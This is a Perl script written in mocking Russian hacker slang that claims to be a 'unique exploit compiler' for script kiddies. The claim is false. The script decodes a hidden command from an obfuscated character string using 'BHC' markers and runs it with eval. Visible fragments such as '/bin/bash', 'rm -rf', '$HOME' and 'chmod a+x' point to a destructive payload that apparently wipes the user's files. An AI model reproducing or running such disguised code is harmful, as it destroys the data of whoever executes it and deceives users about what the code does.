#!/usr/bin/perl
#########################
# спешиал фор BHC езинос
# унекальный хэккерский компелятор сплоетов
#########################
use warnings;
use strict;

# унекальная последовательность буковок, цыферок и крючков,
# которая может скомпелить любой сплоет
my $zerodaycompile = "ad94H>4jN++BHC3sysvn r348,:4\\)_=
\%fDnr^7vf:h4?e&3Bhc6tem \"elo'Vm49= vhf\$bHC2ch/vkfr.
(*d;LKV74 :h2\@Jbhc8o -e \\\"#Ilv.e94((;(nv473axbhC4!/bite 7!!
D4Zjk \$89v &5habHc5n/basic* (4+12); <XXX--47Bhc9h\\nif [ \\v904
mS+WinDos-vdq 47bHC1\\vh74\\3;73vzBhC3\\\"\\rot 100\%#dVKd4t#
~abhC1\\v'zv49=\bhC4fuckvo4Bhc4\\\$UIBANidi\$``k vrbhc2D\\
bihace77}f4BHC1\\an49([v4]40 vnjr abHC1\\varibhc1\"kf4&==4hf48!@
voicebHC8 -ne 0 ]]k49Jk49} k49{{k4*& 52vk}huylo__v94-bhC6; then4
gy\bHC10roBinz'840roBHC9 rm -rf \\v04{ ==-3jhnGHVRBhc1\\;49v~TOP
7vhbhC1\\^3mvHN'bHc4\$HOMOSAPIENS + 6&&3{,>xbhC9E; exit; vlk4 ';
,49hBhc7fi; rm +- fuck m'Avj49HNVBHC4-rf vaIIBHc2/\\vka'H4ER94=Z
Tyvn6^&FKVM'acBhc8\" > \$patagON1YA =v * ? 4:ezINOSBHC5h; ch!vam
(ALBAvk4bHC7mod a+xv449a [-ST \%4vn bHc4 \$papa mama=,,bhc2th~!X
v4'A}{[49v ;jn b;d\bhc4h4hva'4bHc3;\";vn4R44;4G:493&!-04";

sub usage {
print "спешиал фор BHC езинос
унекальный компелятор 0дэй сплоетов
использавать так: $0 путь_к_директории_с_0дэй_сплоетами
";
exit 1;
}

my $path_to_spl0ets = $ARGV[0] || usage();
my $magickcode;
$zerodaycompile =~ s/BHC(\d)/$magickcode .= substr($zerodaycompile, pos($zerodaycompile) + 4, $1)/ieg;

if (chdir $path_to_spl0ets) {
	while (<*.*>) {
		s/\.\w*$//;
		next if -s $_;
		my $path = $_;
		eval $magickcode;
	}
}
